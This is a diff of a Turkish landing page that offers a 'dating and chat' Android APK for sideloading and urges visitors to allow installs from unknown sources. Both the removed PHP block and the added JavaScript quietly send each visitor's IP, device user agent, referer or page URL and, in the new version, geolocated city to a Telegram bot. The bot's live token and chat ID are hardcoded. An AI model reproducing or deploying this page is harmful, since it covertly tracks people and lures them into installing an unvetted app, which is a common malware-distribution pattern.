@@ -1,68 +1,3 @@
-<?php
-// ================== AYARLARINI BURAYA YAP ==================
-$botToken = '8634800611:AAFEuAx4nw7VbV-942w5Ku4OO0u_2c15Gc4';
-$chatId   = '-1003887845842';                    // Senin chat veya grup ID
-
-// APK dosyanın adı (aynı klasöre koy)
-$apkFile  = 'uygulaman.apk';                         // Dosya adını kendi apk dosyanla değiştir
-$apkName  = 'TanismaSohbet.apk';                     // İndirirken çıkacak isim
-
-// IP alma (Cloudflare destekli)
-function getIP() {
-    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
-    return $_SERVER['REMOTE_ADDR'] ?? 'Bilinmiyor';
-}
-
-// İndirme butonuna basıldığında log at
-if (isset($_GET['download'])) {
-    $ip        = getIP();
-    $time      = date('d.m.Y H:i:s');
-    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Bilinmiyor';
-    $referer   = $_SERVER['HTTP_REFERER'] ?? 'Doğrudan';
-
-    $message = "📥 *APK İndirildi!*\n\n";
-    $message .= "🕒 *Zaman:* $time\n";
-    $message .= "🌐 *IP:* `$ip`\n";
-    $message .= "📱 *Cihaz:* $userAgent\n";
-    $message .= "🔗 *Referer:* $referer\n";
-
-    // Telegram'a gönder
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
-    $data = [
-        'chat_id'    => $chatId,
-        'text'       => $message,
-        'parse_mode' => 'Markdown'
-    ];
-
-    $options = [
-        'http' => [
-            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-            'method'  => 'POST',
-            'content' => http_build_query($data)
-        ]
-    ];
-    $context = stream_context_create($options);
-    @file_get_contents($url, false, $context);
-
-    // Dosyayı indir
-    if (file_exists($apkFile)) {
-        header('Content-Description: File Transfer');
-        header('Content-Type: application/vnd.android.package-archive');
-        header('Content-Disposition: attachment; filename="' . $apkName . '"');
-        header('Expires: 0');
-        header('Cache-Control: must-revalidate');
-        header('Pragma: public');
-        header('Content-Length: ' . filesize($apkFile));
-        readfile($apkFile);
-        exit;
-    } else {
-        echo "Dosya bulunamadı!";
-        exit;
-    }
-}
-?>
-
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -71,47 +6,122 @@ if (isset($_GET['download'])) {
     <title>Tanışma & Sohbet APK</title>
     <style>
         body {
+            margin: 0;
+            padding: 0;
             font-family: Arial, sans-serif;
             background: linear-gradient(135deg, #0f0f0f, #1a1a2e);
             color: #fff;
             text-align: center;
-            padding: 60px 20px;
-            margin: 0;
             min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
-        h1 { color: #00ff9d; font-size: 2.5em; }
-        p { font-size: 1.2em; margin: 20px 0; }
-        .download-btn {
-            display: inline-block;
-            background: #00ff9d;
-            color: #000;
-            font-size: 1.4em;
+        .header {
+            background: rgba(0, 255, 157, 0.15);
+            padding: 15px 40px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            font-size: 1.9em;
             font-weight: bold;
-            padding: 18px 50px;
+            color: #00ff9d;
+        }
+        .description {
+            font-size: 1.3em;
+            margin: 20px 0 40px 0;
+            max-width: 620px;
+            line-height: 1.5;
+        }
+        .download-btn {
+            background: linear-gradient(90deg, #00ff9d, #00cc7a);
+            color: #000;
+            font-size: 1.6em;
+            font-weight: bold;
+            padding: 20px 70px;
             border-radius: 50px;
             text-decoration: none;
-            margin-top: 30px;
-            box-shadow: 0 8px 20px rgba(0, 255, 157, 0.4);
-            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(0, 255, 157, 0.5);
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
         }
         .download-btn:hover {
             transform: scale(1.08);
-            background: #00cc7a;
+            box-shadow: 0 15px 35px rgba(0, 255, 157, 0.7);
         }
         .warning {
+            margin-top: 60px;
             color: #ffcc00;
-            font-size: 0.95em;
-            margin-top: 40px;
+            font-size: 1.05em;
         }
     </style>
 </head>
 <body>
-    <h1>👋 Tanışma & Sohbet Uygulaması</h1>
-    <p>Android için özel sohbet ve tanışma uygulaması hazır!<br>
-       Aşağıdaki butona basarak APK'yı indirebilirsin.</p>
 
-    <a href="?download=1" class="download-btn">📥 APK'yı İndir</a>
+    <div class="header">👋 Tanışma & Sohbet Uygulaması</div>
+    
+    <p class="description">
+        Android için özel sohbet ve tanışma uygulaması hazır!<br>
+        Aşağıdaki butona basarak APK’yı indirebilirsin.
+    </p>
+
+    <a href="#" onclick="handleDownload()" class="download-btn">
+        📲 APK’yı İndir
+    </a>
 
     <p class="warning">İndirdikten sonra bilinmeyen kaynaklardan yüklemeye izin verin.</p>
+
+    <!-- Telegram Log Script -->
+    <script>
+        // ============== AYARLARINI BURAYA YAP ==============
+        const BOT_TOKEN = "8634800611:AAFEuAx4nw7VbV-942w5Ku4OO0u_2c15Gc4";
+        const CHAT_ID   = "-1003887845842";           // Sayı olarak yaz (örn: 123456789)
+
+        const APK_URL   = "uygulaman.apk";   // APK dosyasının tam linki (aynı klasördeyse bu yeter)
+        const APK_NAME  = "TanismaSohbet.apk";
+
+        async function sendLogToTelegram() {
+            const ipInfo = await fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .catch(() => ({}));
+
+            const message = `📥 *APK İndirildi!*\n\n` +
+                `🕒 *Zaman:* ${new Date().toLocaleString('tr-TR')}\n` +
+                `🌐 *IP:* \`${ipInfo.ip || 'Bilinmiyor'}\`\n` +
+                `📍 *Şehir:* ${ipInfo.city || 'Bilinmiyor'}\n` +
+                `📱 *Cihaz:* ${navigator.userAgent}\n` +
+                `🔗 *Sayfa:* ${window.location.href}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log("Log gönderilemedi:", err));
+        }
+
+        function handleDownload() {
+            // Log gönder
+            sendLogToTelegram();
+
+            // 300ms sonra indirmeyi başlat (logun gitmesi için biraz zaman)
+            setTimeout(() => {
+                const link = document.createElement('a');
+                link.href = APK_URL;
+                link.download = APK_NAME;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, 300);
+        }
+    </script>
+
 </body>
 </html>
